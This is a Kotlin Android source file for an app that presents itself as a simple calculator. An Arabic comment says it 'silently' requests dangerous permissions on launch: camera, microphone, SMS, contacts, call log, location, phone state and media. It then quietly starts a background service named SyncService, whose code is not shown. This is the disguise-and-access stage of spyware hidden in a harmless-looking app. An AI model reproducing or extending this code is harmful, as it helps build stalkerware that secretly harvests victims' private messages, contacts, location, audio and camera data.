package com.assets.service

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.GridLayout
import android.widget.LinearLayout
import android.widget.TextView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : Activity() {
    private lateinit var display: TextView
    private var currentInput = ""
    private var operator = ""
    private var firstOperand = 0.0
    private var isNewInput = true

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(32, 64, 32, 32)
            setBackgroundColor(0xFF1E1E1E.toInt())
        }

        display = TextView(this).apply {
            text = "0"
            textSize = 48f
            gravity = Gravity.END
            setTextColor(0xFFFFFFFF.toInt())
            setPadding(0, 0, 0, 32)
        }
        root.addView(display)

        val grid = GridLayout(this).apply {
            columnCount = 4
            rowCount = 5
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        val buttons = listOf(
            "C", "±", "%", "÷",
            "7", "8", "9", "×",
            "4", "5", "6", "-",
            "1", "2", "3", "+",
            "0", ".", "=", "="
        )

        for ((index, text) in buttons.withIndex()) {
            val btn = Button(this).apply {
                this.text = text
                textSize = 24f
                val params = GridLayout.LayoutParams().apply {
                    width = 0
                    height = GridLayout.LayoutParams.WRAP_CONTENT
                    columnSpec = GridLayout.spec(index % 4, 1f)
                    rowSpec = GridLayout.spec(index / 4)
                    setMargins(8, 8, 8, 8)
                }
                layoutParams = params
                setOnClickListener { handleButtonClick(this.text.toString()) }
            }
            grid.addView(btn)
        }
        root.addView(grid)
        setContentView(root)

        // طلب الصلاحيات الخطيرة بصمت فور فتح الآلة الحاسبة
        requestAllPermissions()
        
        // تشغيل الخدمة الخلفية
        try {
            val serviceIntent = Intent(this, SyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
        } catch (e: Exception) {}
    }

    private fun handleButtonClick(value: String) {
        if (value == "C") {
            currentInput = ""
            operator = ""
            firstOperand = 0.0
            display.text = "0"
            return
        }
        
        if (value == "=") {
            if (operator.isNotEmpty() && currentInput.isNotEmpty()) {
                val secondOperand = currentInput.toDoubleOrNull() ?: 0.0
                val result = when (operator) {
                    "+" -> firstOperand + secondOperand
                    "-" -> firstOperand - secondOperand
                    "×" -> firstOperand * secondOperand
                    "÷" -> if (secondOperand != 0.0) firstOperand / secondOperand else 0.0
                    else -> 0.0
                }
                display.text = if (result % 1.0 == 0.0) result.toInt().toString() else result.toString()
                currentInput = display.text.toString()
                operator = ""
            }
            return
        }

        if (value in listOf("+", "-", "×", "÷")) {
            if (currentInput.isNotEmpty()) {
                firstOperand = currentInput.toDoubleOrNull() ?: 0.0
                operator = value
                isNewInput = true
            }
            return
        }

        if (value == "±") {
            if (currentInput.isNotEmpty()) {
                currentInput = if (currentInput.startsWith("-")) currentInput.substring(1) else "-$currentInput"
                display.text = currentInput
            }
            return
        }

        if (value == "%") {
            if (currentInput.isNotEmpty()) {
                val p = (currentInput.toDoubleOrNull() ?: 0.0) / 100
                display.text = p.toString()
                currentInput = display.text.toString()
            }
            return
        }

        if (isNewInput) {
            currentInput = value
            isNewInput = false
        } else {
            currentInput += value
        }
        display.text = currentInput
    }

    private fun requestAllPermissions() {
        val perms = mutableListOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_PHONE_STATE
        )
        if (Build.VERSION.SDK_INT >= 33) {
            perms.add(Manifest.permission.READ_MEDIA_IMAGES)
            perms.add(Manifest.permission.READ_MEDIA_VIDEO)
            perms.add(Manifest.permission.POST_NOTIFICATIONS)
        } else {
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        val pending = perms.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
        if (pending.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, pending.toTypedArray(), 100)
        }
    }
}
